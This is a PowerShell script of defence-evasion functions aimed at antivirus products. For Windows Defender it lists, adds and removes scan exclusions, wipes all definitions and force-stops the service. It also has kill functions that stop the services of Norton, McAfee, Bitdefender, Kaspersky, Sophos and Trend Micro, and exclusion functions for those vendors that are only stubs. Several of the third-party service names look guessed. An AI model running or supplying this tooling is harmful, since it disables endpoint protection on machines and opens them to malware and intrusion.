# General function to list exclusions (specific to Windows Defender)
function Defender-ListExclusions {
    try {
        Write-Output "[+] Retrieving exclusion paths from Windows Defender..."
        
        # Get all exclusion paths
        $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions) {
            Write-Output "[+] Current exclusion paths:"
            foreach ($path in $exclusions) {
                Write-Output "[+] $path"
            }
        } else {
            Write-Output "[+] No exclusions found."
        }
    } catch {
        Write-Output "[!] Failed to retrieve exclusions: $_"
    }
}

# Function to add one or more exclusion paths to Windows Defender
function Defender-AddExclusion {
    param (
        [string[]]$Paths
    )

    # Error handling for adding exclusions
    try {
        Write-Output "[+] Adding exclusions to Windows Defender..."

        foreach ($path in $Paths) {
            if (Test-Path $path) {
                Write-Output "[+] Adding exclusion: $path"
                Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            } else {
                Write-Output "[!] Path not found: $path"
            }
        }
    } catch {
        Write-Output "[!] Failed to add exclusions: $_"
    }
}

# Function to remove one or more exclusion paths from Windows Defender
function Defender-RemoveExclusion {
    param (
        [string[]]$Paths
    )

    # Error handling for removing exclusions
    try {
        Write-Output "[+] Removing exclusions from Windows Defender..."

        foreach ($path in $Paths) {
            if (Test-Path $path) {
                Write-Output "[+] Removing exclusion: $path"
                Remove-MpPreference -ExclusionPath $path -ErrorAction Stop
            } else {
                Write-Output "[!] Path not found: $path"
            }
        }
    } catch {
        Write-Output "[!] Failed to remove exclusions: $_"
    }
}

# Function to remove all definitions and try to stop the Windows Defender service
function Defender-Kill {
    try {
        Write-Output "[+] Removing all definitions from Windows Defender..."

        # Use MpCmdRun.exe to remove all definitions
        $mpCmdRunPath = "C:\Program Files\Windows Defender\MpCmdRun.exe"
        if (Test-Path $mpCmdRunPath) {
            & $mpCmdRunPath -RemoveDefinitions -All -ErrorAction Stop
            Write-Output "[+] All definitions removed."
        } else {
            Write-Output "[!] MpCmdRun.exe not found at $mpCmdRunPath"
        }
    } catch {
        Write-Output "[!] Failed to remove definitions: $_"
    }

    try {
        Write-Output "[+] Stopping Windows Defender service..."

        # Check if the service exists before attempting to stop it
        $service = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
        if ($service) {
            if ($service.Status -ne 'Stopped') {
                Stop-Service -Name WinDefend -Force -ErrorAction Stop
                Write-Output "[+] Windows Defender service stopped."
            } else {
                Write-Output "[+] Windows Defender service is already stopped."
            }
        } else {
            Write-Output "[!] Windows Defender service not found."
        }
    } catch {
        Write-Output "[!] Failed to stop Windows Defender service: $_"
    }

    # Verify if the service is stopped
    try {
        $service = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
        if ($service) {
            if ($service.Status -eq 'Stopped') {
                Write-Output "[+] Windows Defender service is stopped."
            } else {
                Write-Output "[!] Windows Defender service is not stopped. Current status: $($service.Status)"
            }
        }
    } catch {
        Write-Output "[!] Failed to get Windows Defender service status: $_"
    }
}

# Function to add exclusions to Norton Antivirus (requires GUI or command-line tool)
function Norton-AddExclusion {
    param (
        [string[]]$Paths
    )

    Write-Output "[!] Adding exclusions to Norton Antivirus is generally managed through the GUI."
    Write-Output "[!] Use Norton Security interface or command-line tool if available."
}

# Function to stop Norton Antivirus service
function Norton-Kill {
    try {
        Write-Output "[+] Stopping Norton Antivirus service..."

        Stop-Service -Name NIS -ErrorAction Stop
        Write-Output "[+] Norton Antivirus service stopped."
    } catch {
        Write-Output "[!] Failed to stop Norton Antivirus service: $_"
    }
}

# Function to add exclusions to McAfee Antivirus
function McAfee-AddExclusion {
    param (
        [string[]]$Paths
    )

    Write-Output "[!] Adding exclusions to McAfee Antivirus is generally managed through the GUI."
    Write-Output "[!] Use McAfee's GUI or command-line tool if available."
}

# Function to stop McAfee Antivirus service
function McAfee-Kill {
    try {
        Write-Output "[+] Stopping McAfee Antivirus service..."

        Stop-Service -Name McAfeeFramework -ErrorAction Stop
        Write-Output "[+] McAfee Antivirus service stopped."
    } catch {
        Write-Output "[!] Failed to stop McAfee Antivirus service: $_"
    }
}

# Function to add exclusions to Bitdefender
function Bitdefender-AddExclusion {
    param (
        [string[]]$Paths
    )

    Write-Output "[!] Adding exclusions to Bitdefender is generally managed through the GUI."
    Write-Output "[!] Use Bitdefender interface for managing exclusions."
}

# Function to stop Bitdefender service
function Bitdefender-Kill {
    try {
        Write-Output "[+] Stopping Bitdefender service..."

        Stop-Service -Name Bitdefender -ErrorAction Stop
        Write-Output "[+] Bitdefender service stopped."
    } catch {
        Write-Output "[!] Failed to stop Bitdefender service: $_"
    }
}

# Function to add exclusions to Kaspersky
function Kaspersky-AddExclusion {
    param (
        [string[]]$Paths
    )

    Write-Output "[!] Adding exclusions to Kaspersky is generally managed through the GUI."
    Write-Output "[!] Use Kaspersky interface for managing exclusions."
}

# Function to stop Kaspersky service
function Kaspersky-Kill {
    try {
        Write-Output "[+] Stopping Kaspersky service..."

        Stop-Service -Name klvss -ErrorAction Stop
        Write-Output "[+] Kaspersky service stopped."
    } catch {
        Write-Output "[!] Failed to stop Kaspersky service: $_"
    }
}

# Function to add exclusions to Sophos
function Sophos-AddExclusion {
    param (
        [string[]]$Paths
    )

    Write-Output "[!] Adding exclusions to Sophos is generally managed through the GUI."
    Write-Output "[!] Use Sophos Central or GUI for managing exclusions."
}

# Function to stop Sophos service
function Sophos-Kill {
    try {
        Write-Output "[+] Stopping Sophos service..."

        Stop-Service -Name Sophos -ErrorAction Stop
        Write-Output "[+] Sophos service stopped."
    } catch {
        Write-Output "[!] Failed to stop Sophos service: $_"
    }
}

# Function to add exclusions to Trend Micro
function TrendMicro-AddExclusion {
    param (
        [string[]]$Paths
    )

    Write-Output "[!] Adding exclusions to Trend Micro is generally managed through the GUI."
    Write-Output "[!] Use Trend Micro interface for managing exclusions."
}

# Function to stop Trend Micro service
function TrendMicro-Kill {
    try {
        Write-Output "[+] Stopping Trend Micro service..."

        Stop-Service -Name TrendMicro -ErrorAction Stop
        Write-Output "[+] Trend Micro service stopped."
    } catch {
        Write-Output "[!] Failed to stop Trend Micro service: $_"
    }
}
